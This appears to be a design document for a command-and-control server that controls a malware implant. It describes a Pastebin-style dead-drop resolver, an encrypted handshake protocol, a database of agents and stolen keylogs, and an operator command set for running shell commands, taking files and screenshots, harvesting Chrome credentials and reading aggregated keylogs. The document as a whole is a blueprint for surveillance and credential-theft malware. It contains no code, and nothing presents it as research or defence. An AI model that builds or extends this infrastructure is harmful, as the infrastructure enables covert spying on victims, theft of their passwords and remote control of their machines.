# C2 Server Architecture

```
┌─────────────────────────────────────────────┐
│                 C2 Server                    │
│                                              │
│  ┌──────────────┐   ┌────────────────────┐  │
│  │   Resolver    │   │   C2 Listener       │  │
│  │  (HTTP)      │   │  (HTTPS + cert pin) │  │
│  │  GET /raw/   │   │                     │  │
│  │  → C2 addr   │   │  POST / → handshake │  │
│  └──────────────┘   │  GET  / → task      │  │
│                      │  POST / → result    │  │
│                      └─────────┬───────────┘  │
│                                │               │
│  ┌─────────────────────────────┴───────────┐  │
│  │           Protocol Layer                 │  │
│  │  - Decrypt static key (pre-handshake)   │  │
│  │  - ECDH handshake → session key         │  │
│  │  - Decrypt/encrypt GCM (post-handshake) │  │
│  │  - Validate X-Agent-ID header           │  │
│  └─────────────────┬───────────────────────┘  │
│                    │                           │
│  ┌─────────────────┴───────────────────────┐  │
│  │              Core Logic                  │  │
│  │  - Agent registry (ID, last seen, etc)  │  │
│  │  - Task queue (per-agent pending tasks) │  │
│  │  - Result store (keylogs, files, text)  │  │
│  │  - Keylog aggregator                    │  │
│  └─────────────────┬───────────────────────┘  │
│                    │                           │
│  ┌─────────────────┴───────────────────────┐  │
│  │              Database                    │  │
│  │  agents | tasks | results | keylogs     │  │
│  │            (SQLite or file-based)        │  │
│  └─────────────────┬───────────────────────┘  │
│                    │                           │
│  ┌─────────────────┴───────────────────────┐  │
│  │          Operator Interface              │  │
│  │  - List agents                          │  │
│  │  - Queue tasks (exec, upload, harvest)  │  │
│  │  - View results / keylogs               │  │
│  │  - Download screenshots/files           │  │
│  │  - Uninstall agent                      │  │
│  └─────────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
```

## Components

### 1. Resolver Endpoint
- Simple HTTP server on a separate port
- Returns the full C2 server address as plaintext
- Simulates the Pastebin dead-drop the implant currently uses
- Allows local development without depending on an external service

### 2. C2 Listener
- HTTPS server using the same `server.crt`/`server.key` generated by `build.sh`
- Three routes:
  - `POST /` — handshake (initial key exchange)
  - `GET /` — task polling (returns pending task or 204)
  - `POST /` — result submission (keylogs, command output, files)

### 3. Protocol Layer
- Mirrors the implant's crypto stack:
  - AES-256-GCM with static key for handshake packets
  - ECDH-P256 key exchange (server-side)
  - HKDF-SHA256 session key derivation
  - AES-256-GCM with session key for all post-handshake traffic
- Validates `X-Agent-ID` header against known agents

### 4. Core Logic
- **Agent registry** — tracks agent ID, first seen, last seen, session key
- **Task queue** — per-agent pending tasks (exec, upload, download, screenshot, harvest, uninstall)
- **Result store** — saves text output, keylogs, and file data
- **Keylog aggregator** — concatenates keylog entries per agent

### 5. Database
- SQLite database with tables:
  - `agents` (id, first_seen, last_seen, session_key)
  - `tasks` (id, agent_id, type, command, path, file_data, destination, status, created_at)
  - `results` (id, agent_id, type, data, filename, errors, keylogs, received_at)

### 6. Operator Interface
- Interactive CLI with commands:
  - `list` — show all agents and their status
  - `exec <agent> <cmd>` — queue a shell command
  - `upload <agent> <local> <remote>` — upload a file
  - `download <agent> <remote> <local>` — download a file
  - `screenshot <agent>` — capture agent's screen
  - `harvest <agent>` — extract Chrome credentials
  - `keylog <agent>` — view aggregated keylogs
  - `result <agent>` — view last task result
  - `uninstall <agent>` — remove implant from target

## Data Flow

```
Implant                          Server
   │                                │
   │──── GET / ────────────────────→│  look up agent's task queue
   │                                │  if task pending → 200 + encrypted task
   │←─── 200 {type:"exec"...} ─────│  if no task → 204
   │                                │
   │  [execute command]             │
   │                                │
   │──── POST / ───────────────────→│  decrypt, store result
   │    {data, keylogs, errors}     │  save keylogs, files
   │                                │
```
